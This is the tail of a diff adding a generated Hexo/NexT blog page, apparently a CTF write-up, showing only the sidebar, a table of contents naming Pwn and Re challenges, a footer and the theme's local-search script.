+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#move"><span class="nav-number">1.1.</span> <span class="nav-text">move</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwthon"><span class="nav-number">1.2.</span> <span class="nav-text">pwthon</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#url%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="nav-number">2.1.</span> <span class="nav-text">url从哪里来</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hello-py"><span class="nav-number">2.2.</span> <span class="nav-text">hello_py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nesting"><span class="nav-number">2.3.</span> <span class="nav-text">nesting</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
